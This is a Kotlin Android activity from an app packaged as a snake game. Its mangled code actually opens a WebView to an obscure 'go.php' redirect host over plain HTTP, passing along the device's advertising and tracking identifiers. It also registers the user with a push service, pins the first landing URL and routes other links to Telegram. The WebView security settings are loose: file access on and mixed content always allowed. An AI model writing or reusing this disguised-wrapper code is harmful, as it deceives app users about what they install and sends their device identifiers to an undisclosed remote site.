package com.snake.io.slither

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.webkit.*
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerLib
import com.google.android.material.snackbar.Snackbar
import com.onesignal.OneSignal
import com.snake.io.slither.AplClasssssssss.Companion.NAMING
import com.snake.io.slither.AplClasssssssss.Companion.DIPING
import com.snake.io.slither.AplClasssssssss.Companion.NOT_VERY_MAIN_ID
import com.snake.io.slither.databinding.ActivityWeeeeebStartBinding
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException

class WeeeeebStartActivity : AppCompatActivity() {
    private val CHOOSE_IMAGE_CODE_RESULT = 1

    var mCameraPhotoPath: String? = null
    var mFileeePathCallbaaack: ValueCallback<Array<Uri>>? = null


    lateinit var mainBindinnng: ActivityWeeeeebStartBinding
    lateinit var webViev: WebView


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        mainBindinnng = ActivityWeeeeebStartBinding.inflate(layoutInflater)
        setContentView(mainBindinnng.root)
        webViev = mainBindinnng.viewWeb
        Snackbar.make(
            mainBindinnng.root, "Loading...",
            Snackbar.LENGTH_LONG
        ).show()

        val vhiteCookieManager = CookieManager.getInstance()
        vhiteCookieManager.setAcceptCookie(true)
        vhiteCookieManager.setAcceptThirdPartyCookies(webViev, true)
        webSettingsfergthyj()
        val vhy_you_make_name_for_activity: Activity = this

        webViev.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (isApppppAlreadyInstall(url)) {

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.data = Uri.parse(url)
                        startActivity(intent)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(url)
            }


            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                saveUrlfergthyju(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(vhy_you_make_name_for_activity, description, Toast.LENGTH_SHORT).show()
            }


        }
        webViev.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                mFileeePathCallbaaack?.onReceiveValue(null)
                mFileeePathCallbaaack = filePathCallback
                var tookicINttttinty: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (tookicINttttinty!!.resolveActivity(packageManager) != null) {

                    // create the file where the photo should go
                    var photoFile: File? = null
                    try {
                        photoFile = createImageFile()
                        tookicINttttinty.putExtra("PhotoPath", mCameraPhotoPath)
                    } catch (ex: IOException) {

                    }
                    if (photoFile != null) {
                        mCameraPhotoPath = "file:" + photoFile.absolutePath
                        tookicINttttinty.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(photoFile)
                        )
                    } else {
                        tookicINttttinty = null
                    }
                }
                val contSelInt = Intent(Intent.ACTION_GET_CONTENT)
                contSelInt.addCategory(Intent.CATEGORY_OPENABLE)
                contSelInt.type = "image/*"
                val intentArray: Array<Intent?> =
                    tookicINttttinty?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val chooserFFFFFForIntent = Intent(Intent.ACTION_CHOOSER)
                chooserFFFFFForIntent.putExtra(Intent.EXTRA_INTENT, contSelInt)
                chooserFFFFFForIntent.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_pic_choose))
                chooserFFFFFForIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
                startActivityForResult(
                    chooserFFFFFForIntent, CHOOSE_IMAGE_CODE_RESULT
                )
                return true
            }

            @Throws(IOException::class)
            private fun createImageFile(): File {
                var dirDoooorImage = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!dirDoooorImage.exists()) {
                    dirDoooorImage.mkdirs()
                }

                dirDoooorImage =
                    File(dirDoooorImage.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return dirDoooorImage
            }

        }

        webViev.loadUrl(regthyjukil())
    }

    private fun webSettingsfergthyj() {
        val webSettings = webViev.settings
        webSettings.javaScriptEnabled = true

        webSettings.useWideViewPort = true

        webSettings.loadWithOverviewMode = true
        webSettings.allowFileAccess = true
        webSettings.domStorageEnabled = true
        webSettings.userAgentString = webSettings.userAgentString.replace("; wv", "")

        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.setSupportMultipleWindows(false)

        webSettings.displayZoomControls = false
        webSettings.builtInZoomControls = true
        webSettings.setSupportZoom(true)

        webSettings.pluginState = WebSettings.PluginState.ON
        webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        webSettings.setAppCacheEnabled(true)

        webSettings.allowContentAccess = true
    }


    private fun pushToOneSignalrergthyj(string: String) {
        OneSignal.setExternalUserId(
            string,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val isPushSuccessOrGood = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $isPushSuccessOrGood"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val isEmailSuccessyydfrtg =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $isEmailSuccessyydfrtg"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val isSmsSuccess = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $isSmsSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }



    private fun regthyjukil(): String {

        val namingI = "naming"
        val linkornull = "deeporg"


        val spoonnny = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)

        val sheredPreferences = getSharedPreferences("SP", MODE_PRIVATE)

        val ddpOneuyyy: String? = sheredPreferences.getString(DIPING, "null")
        val maaainid: String? = sheredPreferences.getString(NOT_VERY_MAIN_ID, null)
        val cpOneyyy: String? = sheredPreferences.getString(NAMING, "null")


        val rack = "com.snake.io.slither"

        val apsFId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)

        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val four_f = "sub_id_4="
        val five_f = "sub_id_5="
        val six_s = "sub_id_6="
        val one_ = "sub_id_1="
        val two_t = "deviceID="
        val three_t = "ad_id="



        val firsttttt = "http://"
        val sicond = "enchantedvolcano.xyz/go.php?to=2&"

        val resultAB = firsttttt + sicond

        val androidVersion = Build.VERSION.RELEASE

        var after = ""
        if (cpOneyyy != "null") {
            after =
                "$resultAB$one_$cpOneyyy&$two_t$apsFId&$three_t$maaainid&$four_f$rack&$five_f$androidVersion&$six_s$namingI"
        } else {
            after =
                "$resultAB$one_$ddpOneuyyy&$two_t$apsFId&$three_t$maaainid&$four_f$rack&$five_f$androidVersion&$six_s$linkornull"
        }
        pushToOneSignalrergthyj(apsFId.toString())
        return spoonnny.getString("SAVED_URL", after).toString()
    }


    private fun isApppppAlreadyInstall(uri: String): Boolean {

        val pm = packageManager
        try {
            pm.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)
            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode != CHOOSE_IMAGE_CODE_RESULT || mFileeePathCallbaaack == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var resultsfrgthy: Array<Uri>? = null

        if (resultCode == AppCompatActivity.RESULT_OK) {
            if (data == null || data.data == null) {

                resultsfrgthy = arrayOf(Uri.parse(mCameraPhotoPath))
            } else {
                val fdefrfdataString = data.dataString
                if (fdefrfdataString != null) {
                    resultsfrgthy = arrayOf(Uri.parse(fdefrfdataString))
                }
            }
        }
        mFileeePathCallbaaack?.onReceiveValue(resultsfrgthy)
        mFileeePathCallbaaack = null
    }


    private var isPressedTvice = false


    var firstUrllli = ""
    fun saveUrlfergthyju(url: String?) {
        if (!url!!.contains("t.me")) {

            if (firstUrllli == "") {
                firstUrllli = getSharedPreferences(
                    "SP_WEBVIEW_PREFS",
                    AppCompatActivity.MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    url
                ).toString()

                val deffrr = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
                val eddfrgtt = deffrr.edit()
                eddfrgtt.putString("SAVED_URL", url)
                eddfrgtt.apply()
            }
        }
    }

    override fun onBackPressed() {

        if (webViev.canGoBack()) {
            if (isPressedTvice) {
                webViev.stopLoading()
                webViev.loadUrl(firstUrllli)
            }
            this.isPressedTvice = true
            webViev.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                isPressedTvice = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }
}